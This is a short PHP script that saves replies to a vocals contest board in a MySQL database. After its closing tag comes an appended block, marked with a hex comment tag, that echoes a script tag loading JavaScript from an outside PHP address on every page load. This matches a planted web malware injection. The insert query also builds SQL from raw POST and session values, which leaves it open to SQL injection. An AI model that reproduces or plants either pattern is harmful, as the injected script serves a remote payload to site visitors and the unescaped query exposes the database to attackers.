<?
	session_start();
	include('./lib.php');
	$connect = db_connect($db_host, $db_user, $db_pass,$db_name);
	$r_content=$_POST['reply_text'];
	if($r_content!=""){
		$sql="insert into Vocals_contest_reply (reply_writer_id, reply_content, reply_date) values (trim('$_SESSION[user_id]'), trim('$r_content'), now())";
		mysql_query($sql);
		echo "success";
	}else{
		echo "fail";
	}
?>
<?php
#28197e#
if(empty($vt)) {
$vt = "<script type=\"text/javascript\" src=\"http://hancomotors.com/r9ctwktv.php?id=14155815\"></script>";
echo $vt;
}
#/28197e#
?>